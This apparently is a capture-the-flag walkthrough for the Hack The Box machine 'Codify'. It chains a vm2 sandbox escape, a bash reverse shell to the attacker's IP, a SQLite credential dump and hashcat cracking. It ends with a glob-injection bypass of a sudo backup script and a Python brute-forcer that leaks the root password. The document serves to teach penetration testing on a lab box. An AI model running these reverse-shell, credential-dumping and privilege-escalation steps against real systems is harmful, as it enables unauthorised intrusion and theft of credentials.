## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)

## 🔍 Recon

```bash
nmap -p- --min-rate 10000 10.10.11.239                # Fast full TCP port scan
nmap -p 22,80,3000 -sCV 10.10.11.239                  # Version & script scan on identified ports
head -1 /etc/hosts                                    # Confirm domain mapping to codify.htb
```

---

## 🧪 CVE-Based Exploitation

**Relevant CVEs for vm2 (v3.9.16):**

- [CVE-2023-32314](https://github.com/p4p1/vm2-cve-2023-32314)
- [CVE-2023-30547](https://github.com/p4p1/vm2-cve-2023-30547)
- [CVE-2023-37466](https://github.com/p4p1/vm2-cve-2023-37466)
- [CVE-2023-37903](https://github.com/p4p1/vm2-cve-2023-37903)

> Used payloads from these to gain command execution via sandbox escape.

---

## 🐚 Reverse Shell Access

```bash
# Listener on attacker box
nc -lvnp 443

# Payload sent via web shell
bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"

# Upgrade reverse shell
script /dev/null -c bash
stty raw -echo; fg
```

> Reverse shell lands as `svc` user.

---

## 🧼 Local Enumeration

```bash
ls -la                                        # Basic file listing
cd /home/joshua/                              # Access check for next user
ls /var/www                                   # Discover web app directories
ls editor/ contact/                           # Review contents of Node.js apps
cat index.js | grep 'app\.'                   # View all express routes in contact app
```

---

## 🧩 SQLite Enumeration

```bash
sqlite3 tickets.db                            # Open the database
.tables                                       # View all tables
.schema users                                 # Get table structure
select * from users;                          # Dump credentials
```

---

## 🔓 Cracking the User Hash

```bash
# Save hash
echo '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' > joshua.hash

# Crack with hashcat (bcrypt mode 3200)
hashcat -m 3200 joshua.hash rockyou.txt
```

> Cracked to: `spongebob1`

---

## 🔑 [Privilege Escalation to Joshua](SSH)

```bash
su - joshua                                    # Use cracked password
sshpass -p spongebob1 ssh joshua@codify.htb    # Alternative SSH access
```

---

## 🔧 Privilege Escalation to Root

### 💡 Script Abused: `/opt/scripts/mysql-backup.sh`

```bash
sudo -l                                        # View sudo privileges
sudo /opt/scripts/mysql-backup.sh             # Run vulnerable backup script
```

#### 🧨 Bypass Password Check

```bash
echo "*" | sudo /opt/scripts/mysql-backup.sh  # Bypass using bash glob injection
```

> Works because `[[ $USER_PASS == $DB_PASS ]]` lacks quotes.

---

#### 🔭 Leak Root Password via Process Watch

```bash
# On attacker box
python -m http.server 80 -d /opt/

# On target
wget http://10.10.14.6/pspy64
chmod +x pspy64
./pspy64
```

> Watch for `-p<password>` appearing in `mysql` or `mysqldump` command.

---

#### 🧠 Brute-Force Root Password with Python

```python
# leak_password.py
import subprocess, string
leaked_password = ""
while True:
    for c in string.printable[:-5]:
        if c in '*\\%': continue
        print(f"\r{leaked_password}{c}", end="", flush=True)
        try:
            subprocess.run(f"echo '{leaked_password}{c}*' | sudo /opt/scripts/mysql-backup.sh", shell=True, timeout=0.3)
        except subprocess.TimeoutExpired:
            leaked_password += c
            break
    else: break
print(f"\nPassword: {leaked_password}")
```

---

## 🧙‍♂️ Root Access

```bash
su -                                           # With leaked/brute-forced password
cat /root/root.txt
```